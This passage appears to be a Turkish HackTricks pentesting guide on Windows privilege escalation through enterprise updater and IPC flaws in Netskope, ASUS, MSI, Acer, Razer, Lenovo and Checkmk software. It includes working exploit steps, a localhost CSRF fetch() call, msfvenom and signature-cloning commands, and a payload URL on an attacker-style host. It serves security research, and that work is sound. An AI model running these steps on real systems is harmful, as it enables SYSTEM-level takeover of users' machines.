# Kurumsal Otomatik Güncelleyicileri ve Yetkili IPC'yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, kurumsal uç nokta ajanlarında ve güncelleyicilerinde bulunan; düşük engelli bir IPC yüzeyi ile ayrıcalıklı bir güncelleme akışı sunan bir Windows yerel ayrıcalık yükseltme zinciri sınıfını geneller. Temsili bir örnek, düşük ayrıcalıklı bir kullanıcının kaydı saldırganın kontrolündeki bir sunucuya yönlendirebildiği ve ardından SYSTEM hizmetine kötü amaçlı bir MSI yükletebildiği Windows için Netskope Client < R129'dur (CVE-2025-0309).<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlere karşı kullanabileceğiniz temel fikirler:
- Yeniden kaydı veya yeniden yapılandırmayı saldırganın sunucusuna yönlendirmek için ayrıcalıklı bir hizmetin localhost IPC'sini kötüye kullanın.
- Üreticinin güncelleme uç noktalarını uygulayın, sahte bir Trusted Root CA sunun ve güncelleyiciyi kötü amaçlı, “imzalı” bir pakete yönlendirin.
- Zayıf imzalayan denetimlerini (CN allow-list'leri), isteğe bağlı digest bayraklarını ve gevşek MSI özelliklerini atlatın.
- IPC “şifrelenmişse”, kayıt defterinde herkesin okuyabildiği makine tanımlayıcılarından anahtar/IV türetin.
- Hizmet arayanları görüntü yolu/süreç adına göre kısıtlıyorsa, allow-list'e alınmış bir sürece kod enjekte edin veya süreci askıya alınmış durumda başlatıp DLL'nizi asgari bir thread-context yamasıyla yükleyin.

Özel yerel TCP hizmetleri, PIN veya başka bir uygulama kimlik bilgisi gerektirseler bile aynı kimlik ve girdi sınırı incelemesinden geçirilmelidir. Dinleyiciyi, çalıştığı süreç ve etkin hizmet hesabıyla eşleştirin; ardından dağıtılmış tam ikili dosyayı/sürümü ve çağıranın kontrol ettiği alanların sabit boyutlu arabelleklerden kopyalanmadan veya alt süreç komutu oluşturmak için kullanılmadan önce uzunluklarının denetlenip denetlenmediğini inceleyin. [Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns), ayrıcalıklı yerel kodda denetlenmeyen harici girdilerin neden tehlikeli olduğunu açıklar. Bir loopback dinleyicisi, sabit kodlanmış kimlik bilgisi veya yalnızca süreç adı; bellek bozulması ya da SYSTEM düzeyinde kod yürütüldüğünü kanıtlamaz. Erişilebilirlik, yetkilendirme, kod yolu ve azaltıcı önlemler birbirinden ayrı koşullardır. Olağan keşif işlemlerini pasif tutun; çalışan bir hizmete çökmesine neden olacak uzunlukta girdiler göndermeyin.

---
## 1) localhost IPC aracılığıyla kaydı saldırganın sunucusuna yönlendirme

Birçok ajan, SYSTEM hizmetiyle localhost TCP üzerinden JSON kullanarak iletişim kuran kullanıcı modu UI süreciyle birlikte gelir.

Netskope'ta gözlemlenenler:
- UI: stAgentUI (düşük bütünlük) ↔ Hizmet: stAgentSvc (SYSTEM)
- IPC komut kimliği 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend ana makinesini (örn. AddonUrl) belirleyen claim'lere sahip bir JWT kayıt token'ı oluşturun. İmza gerekmediğinden alg=None kullanın.
2) JWT'niz ve tenant adınızla provisioning komutunu çağıran IPC mesajını gönderin:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis kayıt/konfigürasyon için sahte sunucunuza istek göndermeye başlar, örneğin:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Çağıran doğrulaması yol/ad tabanlıysa, isteği izin verilenler listesinde bulunan bir tedarikçi binary'sinden başlatın (bkz. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Ağ üzerinden erişilebilen yönetim IPC'si

Bu güven sınırı her zaman localhost ile sınırlı değildir. Bildirilen MyReport Updater 2.1.1 vakasında, bir `LocalSystem` servisi tüm arayüzlerde dinleme yapıyor ve referans ana bilgisayar, bağlantı noktası ve çalışma modu için kimlik doğrulaması gerektirmeyen bir gRPC yapılandırma değişikliğini kabul ediyordu. Uzak varyant için hem dinleyiciye ağ erişimi hem de servisten seçilen referansa giden bağlantı gerekiyordu. Bunları, sonraki paket akışının dosya yazma sınırını aşıp aşamayacağından ayrı olarak değerlendirin.<sup>[[16]](#references)</sup>

---
## 2) SYSTEM olarak kod çalıştırmak için güncelleme kanalını ele geçirmek

İstemci sunucunuzla iletişim kurduğunda, beklenen endpoint'leri uygulayın ve istemciyi saldırganın MSI dosyasına yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir güncelleyici aralığı içeren JSON konfigürasyonu döndürün, örn.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA sertifikası döndürür. Servis bunu Local Machine Trusted Root deposuna yükler.
3) /v2/checkupdate → Kötü amaçlı bir MSI'ye ve sahte bir sürüme işaret eden metadata sağlar.

Gerçek dünyada sık görülen kontrolleri aşma:
- Signer CN allow-list: Servis yalnızca Subject CN'nin “netSkope Inc” veya “Netskope, Inc.” ile eşleşip eşleşmediğini kontrol ediyor olabilir. Sahte CA'nız bu CN'ye sahip bir leaf sertifikası oluşturup MSI'yi imzalayabilir.
- CERT_DIGEST özelliği: CERT_DIGEST adlı zararsız bir MSI özelliği ekleyin. Kurulum sırasında doğrulama yapılmaz.
- İsteğe bağlı digest doğrulaması: Yapılandırma bayrağı (ör. check_msi_digest=false) ek kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI'nizi şu konumdan yükler:
C:\ProgramData\Netskope\stAgent\data\*.msi
ve NT AUTHORITY\SYSTEM olarak rastgele kod çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Yama atlatma dersi: Bir tedarikçi, güncelleme kaynağını kriptografik olarak doğrulamak yerine küçük bir “güvenilir” domain kümesini allow-list'e ekleyerek yanıt veriyorsa, trafiği yönlendirmenize hâlâ olanak tanıyan, tedarikçiye ait yönlendirme servislerini veya reverse proxy'leri arayın. Netskope örneğinde, kamuya açık takip araştırmaları R129 dönemi allow-list'inin, saldırganın kontrolündeki Azure App Service içeriğini proxy'leyen `rproxy.goskope.com` üzerinden hâlâ suistimal edilebildiğini gösterdi. Hostname allow-list'lerini güven sınırı değil, aşılması gereken bir engel olarak değerlendirin.<sup>[[14]](#references)</sup>

Bir diğer hata türü de **kendi içinde tutarlı ancak kimliği doğrulanmamış paket metadata'sıdır**. MyReport vakasında, saldırganın kontrolündeki bir referans değiştirilmiş bir arşiv sunarken aradaki bir bileşen, tedarikçinin MD5 digest ve boyut yanıtlarını updater'a ulaşmadan önce değiştirdi. Bu değerlerin eşleşmesi yalnızca yanıt tutarlılığını kontrol ediyordu; tedarikçi kaynağını doğrulamıyordu. MD5 çakışmasına gerek yoktu. Kurulum dizininin çağıran tarafından seçilebilmesi, ayrıcalıklı çıkarma işlemini bir dosya yazma sınırı hâline getirdi. Ortaya çıkan DLL yükleme primitive'i, [rastgele dosya yazmayı DLL hijacking'e dönüştürme](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) bölümünde ele alınmaktadır.<sup>[[16]](#references)</sup>

---
## 3) Şifrelenmiş IPC isteklerini taklit etme (varsa)

R127'den itibaren Netskope, IPC JSON verisini Base64 gibi görünen bir encryptData alanına sardı. Tersine mühendislik, AES kullanıldığını ve anahtar/IV değerlerinin herhangi bir kullanıcının okuyabildiği registry değerlerinden türetildiğini gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden uygulayıp standart bir kullanıcı hesabından geçerli şifrelenmiş komutlar gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: Bir agent aniden IPC'sini “şifrelemeye” başlarsa, HKLM altında malzeme olarak kullanılan device ID, product GUID ve install ID değerlerini arayın.

---
## 4) IPC çağıran allow-list'lerini aşma (yol/ad kontrolleri)

Bazı servisler, TCP bağlantısının PID'sini bulup görüntü yolu/adını Program Files altında bulunan ve allow-list'e eklenmiş tedarikçi binary'leriyle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak eşin kimliğini doğrulamaya çalışır.

İki pratik bypass:
- Allow-list'e eklenmiş bir prosese (ör. nsdiag.exe) DLL injection uygulayıp IPC'yi içeriden proxy'leme.
- Allow-list'e eklenmiş bir binary'yi askıya alınmış durumda başlatıp, sürücünün uyguladığı tamper kurallarını karşılamak için CreateRemoteThread kullanmadan proxy DLL'nizi başlatın (bkz. §5).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection ile uyumlu injection: askıya alınmış proses + NtContinue yaması

Ürünler genellikle korunan proseslere ait handle'lara verilen tehlikeli hakları kaldırmak için bir minifilter/OB callbacks sürücüsü (ör. Stadrv) içerir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE haklarıyla sınırlar

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) Bir tedarikçi binary'sini CREATE_SUSPENDED ile CreateProcess kullanarak başlatın.
2) Hâlâ almanıza izin verilen handle'ları edinin: proses için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve THREAD_GET_CONTEXT/THREAD_SET_CONTEXT haklarına sahip bir thread handle'ı (veya kodu bilinen bir RIP adresinde yamalıyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya erken yüklenen, eşlenmesi garanti başka bir thunk) üzerine DLL yolunuzda LoadLibraryW çağıran, ardından geri dönen küçük bir stub yazın.
4) Stub'ın proses içinde çalışmasını ve DLL'nizi yüklemesini sağlamak için ResumeThread çağırın.

Zaten korunan bir proseste PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (proses sizin tarafınızdan oluşturuldu), sürücünün politikası karşılanır.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik araçlar
- NachoVPN (Netskope plugin), sahte CA oluşturmayı, kötü amaçlı MSI imzalamayı ve gerekli endpoint'leri sunmayı otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, rastgele (isteğe bağlı olarak AES ile şifrelenmiş) IPC mesajları oluşturan özel bir IPC istemcisidir ve allow-list'e eklenmiş bir binary'den kaynaklanmak için askıya alınmış proses injection'ını içerir.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage iş akışı

Yeni bir endpoint agent veya anakart “helper” paketiyle karşılaştığınızda, privesc hedefi olma ihtimali yüksek bir şeyle karşı karşıya olup olmadığınızı anlamak için genellikle hızlı bir iş akışı yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener'larını listeleyin ve bunları tedarikçi prosesleriyle eşleştirin:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Aday named pipe'ları listele:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Plugin tabanlı IPC sunucularının kullandığı kayıt defteri destekli yönlendirme verilerini çıkarın:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Önce user-mode client'tan endpoint adlarını, JSON key'lerini ve command ID'lerini çıkarın. Packed Electron/.NET frontend'ler sıklıkla şemanın tamamını leak eder:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Süreci sonunda başlatan kod yolunu değil, gerçek güven koşulunu araştırın:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Öncelik vermeye değer örüntüler:
- `CryptQueryObject`/sertifika ayrıştırma işlemlerinin genellikle `WinVerifyTrust` olmadan yapılması, “sertifika mevcut” bilgisinin “sertifika güvenilir” olarak değerlendirildiği anlamına gelir; bu da sertifika klonlamayı veya sahte imzalayıcılarla ilgili diğer numaraları mümkün kılar.
- `Origin`, `Referer`, indirme URL’leri, süreç adları veya imzalayanın CN’leri üzerinde yapılan alt dize/son ek kontrolleri kimlik doğrulama değildir. `contains(".vendor.com")` kontrolü, saldırganın denetimindeki benzer görünümlü alan adlarıyla genellikle istismar edilebilir.
- Düşük ayrıcalıklı GUI “dosya güvenilir” kararını veriyor ve SYSTEM broker yalnızca bu sonucu kullanıyorsa istemci tarafındaki DLL/JS’yi yamalamak veya yeniden uygulamak, güven sınırını tamamen aşmaya yetebilir (Razer tarzı bölünmüş doğrulama).
- Broker bir payload'ı `%TEMP%`/`C:\Windows\Temp` konumuna kopyalıyor ve ardından bu yoldan doğruluyor ya da zamanlıyorsa TOCTOU değiştirme aralıklarını ve daha zayıf denetimlere sahip alternatif `ExecuteTask()` sarmalayıcıları sunan kardeş plugin modüllerini hemen test edin.<sup>[[6]](#references)</sup>

Named pipe ağırlıklı hedeflerde PipeViewer, protokolü derinlemesine tersine mühendisliğe tabi tutmaya başlamadan önce zayıf DACL'leri ve uzaktan erişilebilen pipe'ları tespit etmenin hızlı bir yoludur.<sup>[[11]](#references)</sup>

Hedef, çağıranları yalnızca PID, image path veya süreç adına göre kimlik doğrulamasından geçiriyorsa bunu bir güven sınırı değil, aşılması gereken bir engel olarak değerlendirin: meşru istemciye injection yapmak veya bağlantıyı allowlist'teki bir süreçten kurmak, sunucunun denetimlerini geçmek için çoğu zaman yeterlidir. Özellikle named pipe'lar için, [istemci kimliğine bürünme ve pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) bu primitive'i daha ayrıntılı ele alıyor.

Ayrıcalıklı bir **cleanup veya restore broker** için pipe ACL'sinin yanı sıra yol güven sınırını da inceleyin. Servis çalıştırılabilir dosyası ve kurulum dizini korunsa bile, düşük ayrıcalıklı bir çağıran paylaşılan bir dizinde geri yükleme hedefini seçebilir veya hazırlanmış bir yedekleme dosyasının adını değiştirebilir. Çağıranın restore komutuna erişebildiğini, tam olarak hazırlanan girdiyi veya dosya adını değiştirebildiğini, broker'ın daha yüksek ayrıcalıklı bir kimlikle çalıştığını ve restore işleminin seçilen korumalı yola gerçekten yazdığını ayrı ayrı doğrulayın. Yazılabilir bir hazırlama dizini veya okunabilir bir pipe tek başına ayrıcalıklı, keyfi bir yazma imkanı olduğunu kanıtlamaz; hedef eşlemesi ve servis davranışı kod incelemesiyle veya kontrollü testlerle doğrulanmalıdır. Pasif keşif sırasında bilinmeyen bir cleanup komutunu çalıştırmayın; kullanıcı dosyalarını silebilir.

---
## 8) Yalnızca vendor imzalarına göre kimlik doğrulaması yapan modüler add-in broker'ları (Lenovo Vantage örüntüsü)

Avlanmaya değer yeni bir varyasyon **signed-client RPC broker**'dır: düşük ayrıcalıklı, Lenovo imzalı bir masaüstü süreci SYSTEM servisiyle iletişim kurar ve servis, JSON komutlarını `%ProgramData%` altındaki XML ile tanımlanan bir dizi add-in'e yönlendirir. Kabul edilen herhangi bir imzalı istemcinin **içinde** kod yürütme elde edildiğinde, her `runas="system"` sözleşmesi saldırı yüzeyinizin bir parçası hâline gelir.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmalarında gözlemlenen yüksek değerli primitive'ler:
- **Çağırana vendor tarafından imzalandığı için güvenmek**: Araştırmacılar, Lenovo imzalı bir EXE'yi yazılabilir bir dizine kopyalayıp DLL side-load (`profapi.dll`) koşulunu sağlayarak, servisin zaten güvendiği bir istemci içinde keyfi kod çalıştırarak kimliği doğrulanmış bir bağlama ulaştı.
- **Manifest odaklı saldırı yüzeyi keşfi**: Add-in'ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; çeşitli sözleşmeler `SYSTEM` olarak çalışır, bu nedenle bu manifestleri listelemek çoğu zaman broker'ın kendisini tersine mühendisliğe tabi tutmaktan daha hızlı şekilde gerçek ayrıcalıklı eylemleri ortaya çıkarır.
- **Kimliği doğrulanmış kanalın ardındaki komut bazlı açıklar**: Güvenilen istemcinin içinde olduktan sonra, kamuya açık araştırmalar güncelleme/kurulum eylemlerinde path traversal + race condition'lar, ayrıcalıklı ayar veritabanlarında raw-SQL abuse ve amaçlanan hive dışına yazmaya imkan veren alt dize tabanlı registry path denetimleri buldu.

Bir hedefte işe yarar recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Pratik çıkarım: Bir yardımcı araç paketi önce **çağıran süreci** doğrulayan ve ancak bundan sonra düzinelerce plugin/add-in komutuna yönlendirme yapan bir broker sunuyorsa, ön kapıdaki güven denetimini atlatınca durmayın. Manifest/sözleşme tablosunu dökün ve yüksek ayrıcalıklı her fiili bağımsız olarak fuzz testine tabi tutun; kimliği doğrulanmış kanal genellikle ikinci aşamada birkaç hatayı gizler.

---
## 1) Ayrıcalıklı HTTP API’lerine karşı tarayıcıdan localhost’a CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 adresinde, tarayıcı çağrılarının https://driverhub.asus.com adresinden geldiğini varsayan bir kullanıcı modu HTTP hizmeti (ADU.exe) sunar. Origin filtresi, Origin başlığında ve `/asus/v1.0/*` tarafından sunulan indirme URL’lerinde yalnızca `string_contains(".asus.com")` denetimini yapar. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi saldırgan denetimindeki herhangi bir host denetimden geçer ve JavaScript üzerinden durum değiştiren istekler gönderebilir.<sup>[[6]](#references)</sup> Ek atlatma yöntemleri için [CSRF temelleri](../../pentesting-web/csrf-cross-site-request-forgery.md) sayfasına bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve orada kötü amaçlı bir web sayfası barındırın.
2) `fetch` veya XHR kullanarak `http://127.0.0.1:53000` üzerindeki ayrıcalıklı bir uç noktayı (ör. `Reboot`, `UpdateApp`) çağırın.
3) İşleyicinin beklediği JSON gövdesini gönderin – paketlenmiş frontend JS, aşağıdaki şemayı gösterir.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Aşağıda gösterilen PowerShell CLI, Origin header güvenilen değere spoof edildiğinde bile başarılı olur:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Saldırgan sitesine yapılan herhangi bir tarayıcı ziyareti böylece SYSTEM yardımcı programını çalıştıran 1 tıklamalı (veya `onload` aracılığıyla 0 tıklamalı) bir yerel CSRF'ye dönüşür.

---
## 2) Güvensiz code-signing doğrulaması ve sertifika klonlama (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON gövdesinde tanımlanan rastgele yürütülebilir dosyaları indirir ve `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda önbelleğe alır. İndirme URL'si doğrulaması aynı alt dize mantığını kullanır; bu nedenle `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirme sonrasında ADU.exe, çalıştırmadan önce yalnızca PE dosyasının bir imza içerdiğini ve Subject dizesinin ASUS ile eşleştiğini kontrol eder; `WinVerifyTrust` veya zincir doğrulaması yapmaz.

Akışı silahlandırmak için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS imzalayanını payload'a klonlayın (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir domainde barındırın ve yukarıdaki tarayıcı CSRF'si aracılığıyla UpdateApp'i tetikleyin.

Hem Origin hem de URL filtreleri alt dize temelli olduğundan ve imzalayan kontrolü yalnızca dizeleri karşılaştırdığından DriverHub, saldırganın binary dosyasını yükseltilmiş bağlamda indirip çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Updater kopyalama/çalıştırma yollarında TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center'ın SYSTEM hizmeti, her çerçevenin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protokolü sunar. Temel bileşen (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` komutuyla birlikte gelir. İşleyicisi:
1) Sağlanan yürütülebilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) İmzayı `CS_CommonAPI.EX_CA::Verify` ile doğrular (sertifika subject'i “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Geçici dosyayı saldırganın kontrolündeki argümanlarla SYSTEM olarak çalıştıran zamanlanmış bir görev oluşturur.

Kopyalanan dosya, doğrulama ile `ExecuteTask()` arasında kilitlenmez. Saldırgan şunları yapabilir:
- Frame A'yı göndererek meşru, MSI imzalı bir binary dosyasına işaret etmesini sağlar (imza kontrolünün geçmesini ve görevin kuyruğa alınmasını garanti eder).
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe` dosyasının üzerine kötü amaçlı bir payload yazan tekrarlanan Frame B mesajlarıyla yarışır.

Zamanlayıcı tetiklendiğinde, özgün dosya doğrulanmış olmasına rağmen üzerine yazılmış payload'ı SYSTEM olarak çalıştırır. Güvenilir istismar için TOCTOU penceresini yakalayana kadar CMD_AutoUpdateSDK'yi spam'leyen iki goroutine/thread kullanılır.<sup>[[6]](#references)</sup>

---
## 2) Özel SYSTEM düzeyindeki IPC ve impersonation'ı kötüye kullanma (MSI Center + Acer Control Centre)

### MSI Center TCP komut kümeleri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir çerçevenin ilk 4 baytı o bileşeni seçerek saldırganların komutları rastgele modüllere yönlendirmesini sağlar.
- Plugin'ler kendi task runner'larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve **imza doğrulaması yapmadan** doğrudan `API_Support.EX_Task::ExecuteTask()` çağrısı yapar; herhangi bir yerel kullanıcı bu komutu `C:\Users\<user>\Desktop\payload.exe` dosyasına yönlendirerek güvenilir biçimde SYSTEM olarak kod çalıştırabilir.
- Loopback trafiğini Wireshark ile yakalamak veya .NET binary dosyalarını dnSpy'da enstrümante etmek, Component ↔ command eşlemesini hızla ortaya çıkarır; ardından özel Go/Python istemcileri çerçeveleri yeniden oynatabilir.<sup>[[6]](#references)</sup>

### Acer Control Centre adlandırılmış pipe'ları ve impersonation düzeyleri
- SYSTEM olarak çalışan `ACCSvc.exe`, `\\.\pipe\treadstone_service_LightMode` pipe'ını sunar ve isteğe bağlı ACL'si uzak istemcilere de izin verir (ör. `\\TARGET\pipe\treadstone_service_LightMode`). Bir dosya yolu içeren 7 numaralı komut ID'si gönderildiğinde hizmetin süreç başlatma yordamı çağrılır.
- İstemci kütüphanesi, argümanlarla birlikte 113 değerindeki özel bir sonlandırıcı baytı serileştirir. Frida/`TsDotNetLib` ile dinamik enstrümantasyon ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümündeki enstrümantasyon ipuçlarına bakın), yerel işleyicinin `CreateProcessAsUser` çağrısından önce bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID değerine eşlediğini gösterir.
- 113 (`0x71`) değeri 114 (`0x72`) ile değiştirildiğinde, SYSTEM token'ının tamamını koruyan ve yüksek integrity SID (`S-1-16-12288`) ayarlayan genel dala geçilir. Böylece başlatılan binary hem yerel hem de makineler arası kullanımda kısıtlanmamış SYSTEM olarak çalışır.
- Bunu açığa çıkan yükleyici seçeneğiyle (`Setup.exe -nocheck`) birleştirerek ACC'yi laboratuvar VM'lerinde bile kurabilir ve üretici donanımı olmadan pipe'ı test edebilirsiniz.<sup>[[6]](#references)</sup>

Bu IPC açıkları, localhost hizmetlerinin neden karşılıklı kimlik doğrulaması (ALPC SIDs, `ImpersonationLevel=Impersonation` filtreleri, token filtering) uygulaması gerektiğini ve her modülün “rastgele binary çalıştırma” yardımcısının neden aynı signer doğrulamalarını kullanması gerektiğini gösterir.

---
## 3) Zayıf user-mode doğrulamasıyla desteklenen COM/IPC “elevator” yardımcıları (Razer Synapse 4)

Razer Synapse 4, bu aileye başka bir kullanışlı örüntü ekledi: düşük ayrıcalıklı bir kullanıcı, `RzUtility.Elevator` aracılığıyla süreç başlatması için bir COM yardımcısından istekte bulunabilir; güven kararı ise ayrıcalıklı sınır içinde güçlü biçimde uygulanmak yerine user-mode DLL'i (`simple_service.dll`) tarafından verilir.

Gözlemlenen istismar yolu:
- `RzUtility.Elevator` COM nesnesini oluşturun.
- Yükseltilmiş başlatma isteğinde bulunmak için `LaunchProcessNoWait(<path>, "", 1)` çağrısını yapın.
- Herkese açık PoC'de, istek gönderilmeden önce `simple_service.dll` içindeki PE-signature kontrolü devre dışı bırakılarak saldırganın seçtiği herhangi bir yürütülebilir dosyanın başlatılması sağlanır.<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell çağrısı:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Genel çıkarım: “helper” paketlerini reverse ederken localhost TCP veya named pipe'larla yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM sınıflarını kontrol edin, ardından ayrıcalıklı hizmetin hedef binary'yi gerçekten kendisinin doğrulayıp doğrulamadığını ya da yalnızca patch'lenebilir bir user-mode client DLL tarafından hesaplanan sonuca güvenip güvenmediğini doğrulayın. Bu örüntü Razer'ın ötesinde de geçerlidir: yüksek ayrıcalıklı broker'ın düşük ayrıcalıklı taraftan gelen bir izin/verme kararını kullandığı her bölünmüş tasarım, privesc saldırı yüzeyi adayıdır.


---
## MSI onarımı sırasında öngörülebilir temp script yürütme (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent'ları ayrıcalıklı eylemleri hâlâ `C:\Windows\Temp` dizinine geçici bir `.cmd` yazıp bunu `SYSTEM` olarak çalıştırarak gerçekleştiriyor. Dosya adı öngörülebilir olduğunda ve hizmet mevcut dosyaları güvenli biçimde yeniden oluşturmadığında, düşük ayrıcalıklı bir kullanıcı gelecekte kullanılacak temp dosyasını önceden **read-only** olarak oluşturabilir ve ayrıcalıklı sürecin kendi script'i yerine saldırganın kontrolündeki içeriği çalıştırmasını sağlayabilir.

Savunmasız Checkmk Agent derlemelerinde gözlemlenenler:
- temp şablonu: `cmk_all_<PID>_1.cmd`
- etkilenen dallar: `2.0.0`, `2.1.0`, `2.2.0`
- tetikleyici: önbelleğe alınmış agent paketinin MSI **onarımı**<sup>[[8]](#references)[[9]](#references)</sup>

Uygulamalı iş akışı:
1. Mevcut süreç kimliklerinden veya çalışan agent PID'sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload'ı yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` yönlendirmesi kullanın; batch dosyaları için UTF-16 PowerShell çıktısından kaçının).
3. Aday aralığı boyunca `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyalarını oluşturun ve her birini read-only olarak işaretleyin.
4. Ayrıcalıklı hizmetin temp script'i yeniden oluşturmayı denemesini ve ardından çalıştırmasını sağlamak için önbelleğe alınmış MSI'ın onarımını tetikleyin.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Güvenlik açığı bulunan ürün Windows Installer ile yüklüyse, onarımı başlatmadan önce `C:\Windows\Installer` altındaki rastgele görünen önbelleğe alınmış MSI dosyasının hangi ürüne ait olduğunu belirleyin:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
